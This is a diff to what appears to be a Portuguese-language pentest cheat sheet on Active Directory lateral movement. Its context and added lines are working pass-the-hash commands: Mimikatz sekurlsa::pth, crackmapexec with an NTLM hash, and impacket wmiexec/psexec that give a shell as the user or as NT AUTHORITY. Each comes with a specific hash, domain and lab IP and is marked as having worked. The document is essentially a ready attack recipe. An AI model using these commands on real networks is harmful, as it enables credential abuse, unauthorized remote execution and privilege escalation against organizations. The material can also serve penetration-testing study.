@@ -1254,14 +1254,18 @@ Sekurlsa::pth /user:goku /domain:tech.local /ntlm:4533aaba903fbbe1377deb16427432
 Sekurlsa::pth /user:tech\goku /domain:tech.local /ntlm:4533aaba903fbbe1377deb1642743283 /run:powershell.exe
 Sekurlsa::pth /user:goku /domain:tech.local /aes256:e22ebc7f0546cb07424c6b261596c27440b876c01aa3af04ace01da58fdea26f /run:powershell.exe
 ```
-##### LATERAL MOVEMENT CRACKMAPEXEC - OVER PASS THE HASH LINUX PARA WINDOWS (FUNCIONOU)
+##### LATERAL MOVEMENT CRACKMAPEXEC - OVER PASS THE HASH LINUX PARA WINDOWS (FUNCIONOU - COMANDO)
 ```
-crackmapexec smb 172.31.13.86 -u goku -H 4533aaba903fbbe1377deb1642743283 -d tech.local -x hostname
+crackmapexec smb 172.31.13.86 -u goku -H 4533aaba903fbbe1377deb1642743283 -d tech.local -x whoami
 ```
-
-
-
-
+##### LATERAL MOVEMENT IMPACKET-WMIEXEC - OVER PASS THE HASH LINUX PARA WINDOWS (FUNCIONOU - PROMPT COMO O USUARIO)
+```
+impacket-wmiexec tech.local/goku@172.31.11.96 -hashes 00000000000000000000000000000000:4533aaba903fbbe1377deb1642743283
+```
+##### LATERAL MOVEMENT IMPACKET-WMIEXEC - OVER PASS THE HASH LINUX PARA WINDOWS (FUNCIONOU - PROMPT COMO O NTAUTHORITY)
+```
+impacket-psexec tech.local/goku@172.31.11.96 -hashes 00000000000000000000000000000000:4533aaba903fbbe1377deb1642743283
+```
 
 
 
